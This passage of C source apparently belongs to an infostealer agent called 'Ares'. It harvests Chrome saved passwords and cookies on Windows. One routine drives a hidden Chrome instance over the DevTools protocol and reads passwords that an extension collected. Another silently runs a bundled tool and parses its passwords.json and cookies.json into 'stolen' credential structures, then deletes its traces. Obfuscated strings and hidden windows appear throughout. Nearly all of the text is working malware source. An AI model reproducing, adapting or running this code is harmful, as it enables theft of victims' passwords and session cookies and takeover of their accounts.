    for (int retry = 0; retry < 10 && rlen <= 0; retry++) {
        Sleep(1000);
        rlen = cdp_http_get(debugPort, "/json/version", resp, 65536);
    }
    if (rlen <= 0) {
        HeapFree(GetProcessHeap(), 0, resp);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess);
        goto cleanup_temp;
    }

    /* Extract WebSocket URL */
    char wsPath[512] = {0};
    { char _wskey[24]; DEC_CDP_WS_KEY(_wskey);
      char _wsk2[32]; snprintf(_wsk2, sizeof(_wsk2), "\"%s\"", _wskey);
      char* ws = strstr(resp, _wsk2);
      if (ws) {
        char* u = strstr(ws, "ws://");
        if (u) { u+=5; while(*u&&*u!='/')u++;
          char* end=u; while(*end&&*end!='"'&&*end!='\r')end++;
          int l=(int)(end-u); if(l>0&&l<511){memcpy(wsPath,u,l);wsPath[l]=0;}
        }
      }
    }

    if (!wsPath[0]) {
        HeapFree(GetProcessHeap(), 0, resp);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess);
        goto cleanup_temp;
    }

    /* Connect WebSocket */
    HINTERNET hWs = cdp_ws_connect(debugPort, wsPath);
    if (!hWs) {
        HeapFree(GetProcessHeap(), 0, resp);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess);
        goto cleanup_temp;
    }

    /* Enable Page domain */
    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "{\"id\":1,\"method\":\"Page.enable\"}");
    cdp_send_and_wait(hWs, cmd, 1, resp, 65536);

    HeapFree(GetProcessHeap(), 0, resp);

    /* ── Step 5: Wait for extension to process URLs + collect results ── */
    int decrypted = 0;

    /* Extension auto-starts and navigates to each URL from urls.json.
     * Wait for it to finish (check chrome.storage.local for 'done' flag) */
    Sleep(5000); /* Initial wait for extension service worker */

    char* presp = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2*1024*1024);
    if (!presp) goto step6_cleanup;

    /* Find extension's service worker target via CDP */
    snprintf(cmd, sizeof(cmd), "{\"id\":10,\"method\":\"Target.getTargets\"}");
    cdp_send_and_wait(hWs, cmd, 10, presp, 2*1024*1024);

    char swTargetId[128] = {0};
    { /* Find target with type=service_worker and title containing Helper */
      char* pos = strstr(presp, "service_worker");
      if (pos) {
        /* Search backwards for targetId */
        char* tid = presp;
        char* best = NULL;
        while ((tid = strstr(tid, "\"targetId\":\"")) != NULL) {
          if (tid < pos) best = tid;
          tid += 12;
        }
        if (best) {
          best += 12; char* e = strchr(best, '"');
          if (e) { int l=(int)(e-best); if(l<127) memcpy(swTargetId,best,l); }
        }
      }
    }

    /* Poll extension storage for results (up to 90 seconds) */
    for (int poll = 0; poll < 18 && decrypted == 0; poll++) {
        Sleep(5000);

        /* Use any page context to read extension storage via CDP */
        /* Navigate to about:blank and evaluate storage read */
        if (swTargetId[0]) {
            snprintf(cmd, sizeof(cmd),
                "{\"id\":20,\"method\":\"Target.attachToTarget\",\"params\":"
                "{\"targetId\":\"%s\",\"flatten\":true}}", swTargetId);
            cdp_send_and_wait(hWs, cmd, 20, presp, 2*1024*1024);

            char swSession[128] = {0};
            { char* s = strstr(presp, "\"sessionId\":\"");
              if (s) { s+=13; char*e=strchr(s,'"'); if(e) { int l=(int)(e-s); if(l<127) memcpy(swSession,s,l); } } }

            if (swSession[0]) {
                /* Read results from extension storage */
                snprintf(cmd, sizeof(cmd),
                    "{\"id\":21,\"method\":\"Runtime.evaluate\",\"params\":"
                    "{\"expression\":\"new Promise(r=>chrome.storage.local.get(null,d=>r(JSON.stringify(d))))\","
                    "\"awaitPromise\":true,\"returnByValue\":true},"
                    "\"sessionId\":\"%s\"}", swSession);
                cdp_send_and_wait(hWs, cmd, 21, presp, 2*1024*1024);

                /* Check if extension reported done */
                if (strstr(presp, "\"done\":true") || strstr(presp, "\\\"done\\\":true")) {
                    /* Parse collected passwords and match back to creds */
                    for (int i = 0; i < count; i++) {
                        { char _s[16]; DEC_STATUS_V20_BLOCKED(_s); if (strcmp(creds[i].decrypt_status, _s) != 0) continue; }
                        const char* url_s = creds[i].url;
                        if (strncmp(url_s, "http://", 7) == 0) url_s += 7;
                        else if (strncmp(url_s, "https://", 8) == 0) url_s += 8;
                        else continue;
                        char dom[128]={0}; int di=0;
                        while(*url_s && *url_s!='/' && *url_s!=':' && di<126) dom[di++]=*url_s++;
                        if(di<3) continue;

                        char* dp = presp;
                        while ((dp = strstr(dp, dom)) != NULL) {
                            char* pp = strstr(dp, "\\\"p\\\":\\\"");
                            if (!pp || (pp-dp)>400) { dp++; continue; }
                            pp += 6;
                            char* pe = strstr(pp, "\\\"");
                            if (pe && (pe-pp)>0 && (pe-pp)<256) {
                                int pl=(int)(pe-pp);
                                memcpy(creds[i].password, pp, pl);
                                creds[i].password[pl]='\0';
                                strncpy(creds[i].decrypt_status, "ok", 15);
                                decrypted++;
                            }
                            break;
                        }
                    }
                    break; /* Done polling */
                }
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, presp);

step6_cleanup:
    p_WinHttpWebSocketClose(hWs, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
    p_WinHttpCloseHandle(hWs);
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);

    /* NO Chrome restart needed — user's Chrome was never killed! */

cleanup_temp:
    /* Recursively delete temp profile */
    {
        /* Delete known files first */
        for (int f = 0; filesToCopy[f]; f++) {
            char df[MAX_PATH+256];
            snprintf(df, sizeof(df), "%s\\%s", tempProfile, filesToCopy[f]);
            DeleteFileA(df);
        }
        RemoveDirectoryA(tempDefault);
        RemoveDirectoryA(tempProfile);
    }

    return decrypted;
}


/* ============================================================
 * Ares_StealChromelevator — Reflective Hollow Chrome via
 * chromelevator_x64.exe (by @xaitax). Drops tool alongside
 * agent, runs silent, parses JSON output, returns creds.
 * ============================================================ */

/* Minimal JSON field extractor — no malloc, stack only */
static int _clev_extract_str(const char* json, const char* key,
                              char* out, int out_sz)
{
    /* Find "key":"value" pattern */
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\":\"", key);
    const char* p = strstr(json, pat);
    if (!p) return 0;
    p += strlen(pat);
    const char* e = p;
    while (*e && *e != '"') {
        if (*e == '\\') e++; /* skip escaped char */
        e++;
    }
    int len = (int)(e - p);
    if (len <= 0 || len >= out_sz) return 0;
    memcpy(out, p, len);
    out[len] = '\0';
    /* Unescape \" -> " and \\ -> \ */
    int wi = 0;
    for (int ri = 0; ri < len; ri++) {
        if (out[ri] == '\\' && ri+1 < len) {
            ri++;
            if (out[ri] == '"') out[wi++] = '"';
            else if (out[ri] == '\\') out[wi++] = '\\';
            else if (out[ri] == 'n') out[wi++] = '\n';
            else { out[wi++] = '\\'; out[wi++] = out[ri]; }
        } else {
            out[wi++] = out[ri];
        }
    }
    out[wi] = '\0';
    return wi;
}

/* Parse one passwords.json array entry into DECRYPTED_CRED */
static int _clev_parse_passwords_json(const char* buf, DECRYPTED_CRED* creds, int max)
{
    int count = 0;
    const char* p = buf;
    while (count < max && (p = strstr(p, "{\"url\"")) != NULL) {
        DECRYPTED_CRED* c = &creds[count];
        memset(c, 0, sizeof(*c));
        _clev_extract_str(p, "url",  c->url,      sizeof(c->url));
        _clev_extract_str(p, "user", c->username,  sizeof(c->username));
        _clev_extract_str(p, "pass", c->password,  sizeof(c->password));
        if (c->url[0] || c->username[0]) {
            snprintf(c->decrypt_status, sizeof(c->decrypt_status), "ok");
            snprintf(c->browser, sizeof(c->browser), "chrome");
            count++;
        }
        p++;
    }
    return count;
}

/* Parse one cookies.json array entry into STOLEN_COOKIE */
static int _clev_parse_cookies_json(const char* buf, STOLEN_COOKIE* cookies, int max)
{
    int count = 0;
    const char* p = buf;
    while (count < max && (p = strstr(p, "{\"")) != NULL) {
        STOLEN_COOKIE* c = &cookies[count];
        memset(c, 0, sizeof(*c));
        _clev_extract_str(p, "domain", c->host, sizeof(c->host));
        _clev_extract_str(p, "name",   c->name,  sizeof(c->name));
        _clev_extract_str(p, "value",  c->value, sizeof(c->value));
        _clev_extract_str(p, "path",   c->path,  sizeof(c->path));
        snprintf(c->browser, sizeof(c->browser), "chrome");
        if (c->host[0] || c->name[0]) count++;
        p++;
    }
    return count;
}

/* Read entire file into heap buffer (caller frees). Returns NULL on fail. */
static char* _clev_read_file(const char* path)
{
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == 0 || sz > 16*1024*1024) { CloseHandle(hf); return NULL; }
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, sz + 1);
    if (!buf) { CloseHandle(hf); return NULL; }
    DWORD rd;
    ReadFile(hf, buf, sz, &rd, NULL);
    CloseHandle(hf);
    buf[rd] = '\0';
    return buf;
}


/* v3.7 FIX-10: Second chromelevator code path also guarded */
#ifdef ARES_INCLUDE_CHROMELEVATOR
/* Recursively delete directory and contents */
static void _clev_rmdir_r(const char* dir)
{
    char pat[MAX_PATH+4];
    snprintf(pat, sizeof(pat), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) { RemoveDirectoryA(dir); return; }
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
        char fp[MAX_PATH+256];
        snprintf(fp, sizeof(fp), "%s\\%s", dir, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            _clev_rmdir_r(fp);
        } else {
            SetFileAttributesA(fp, FILE_ATTRIBUTE_NORMAL);
            DeleteFileA(fp);
        }
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    RemoveDirectoryA(dir);
}

int Ares_StealChromelevator(DECRYPTED_CRED* creds, int max_creds,
                             STOLEN_COOKIE* cookies, int max_cookies)
{
    /* ── 1. Locate chromelevator_x64.exe alongside agent ── */
    char agentDir[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, agentDir, MAX_PATH);
    /* Strip filename → agent directory */
    char* slash = strrchr(agentDir, '\\');
    if (slash) *slash = '\0';

    char clevPath[MAX_PATH+64];
    snprintf(clevPath, sizeof(clevPath),
             "%s\\tools\\chromelevator\\chromelevator_x64.exe", agentDir);

    if (GetFileAttributesA(clevPath) == INVALID_FILE_ATTRIBUTES) {
        /* Fallback: try same dir as agent */
        snprintf(clevPath, sizeof(clevPath),
                 "%s\\chromelevator_x64.exe", agentDir);
        if (GetFileAttributesA(clevPath) == INVALID_FILE_ATTRIBUTES)
            return 0; /* tool not found */
    }

    /* ── 2. Create temp output dir ── */
    char tmpBase[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpBase);
    char outDir[MAX_PATH+64];
    snprintf(outDir, sizeof(outDir), "%s\\ares_clev_%lu", tmpBase, GetTickCount());
    CreateDirectoryA(outDir, NULL);

    /* ── 3. Build cmdline: chromelevator_x64.exe -o <outDir> chrome ── */
    char cmdline[MAX_PATH*2 + 128];
    snprintf(cmdline, sizeof(cmdline),
             "\"%s\" -o \"%s\" chrome", clevPath, outDir);

    /* ── 4. Launch silent, no window, wait max 120s ── */
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        _clev_rmdir_r(outDir);
        return 0;
    }

    WaitForSingleObject(pi.hProcess, 120000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* ── 5. Walk outDir\Chrome\<Profile>\passwords.json & cookies.json ── */
    int total_creds = 0, total_cookies = 0;

    char chromePath[MAX_PATH+64];
    snprintf(chromePath, sizeof(chromePath), "%s\\Chrome", outDir);

    WIN32_FIND_DATAA pfd;
    char profPat[MAX_PATH+128];
    snprintf(profPat, sizeof(profPat), "%s\\*", chromePath);
    HANDLE hProf = FindFirstFileA(profPat, &pfd);
    if (hProf == INVALID_HANDLE_VALUE) goto clev_cleanup;

    do {
        if (!(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (!strcmp(pfd.cFileName, ".") || !strcmp(pfd.cFileName, "..")) continue;

        char profileDir[MAX_PATH+128];
        snprintf(profileDir, sizeof(profileDir), "%s\\%s", chromePath, pfd.cFileName);

        /* passwords.json */
        if (total_creds < max_creds) {
            char pwPath[MAX_PATH+256];
            snprintf(pwPath, sizeof(pwPath), "%s\\passwords.json", profileDir);
            char* buf = _clev_read_file(pwPath);
            if (buf) {
                int got = _clev_parse_passwords_json(buf, creds + total_creds,
                                                     max_creds - total_creds);
                total_creds += got;
                HeapFree(GetProcessHeap(), 0, buf);
            }
        }

        /* cookies.json */
        if (cookies && total_cookies < max_cookies) {
            char ckPath[MAX_PATH+256];
            snprintf(ckPath, sizeof(ckPath), "%s\\cookies.json", profileDir);
            char* buf = _clev_read_file(ckPath);
            if (buf) {
                int got = _clev_parse_cookies_json(buf, cookies + total_cookies,
                                                   max_cookies - total_cookies);
                total_cookies += got;
                HeapFree(GetProcessHeap(), 0, buf);
            }
        }

    } while (FindNextFileA(hProf, &pfd));
    FindClose(hProf);

clev_cleanup:
    _clev_rmdir_r(outDir);

    return total_creds;
}
#endif /* ARES_INCLUDE_CHROMELEVATOR */
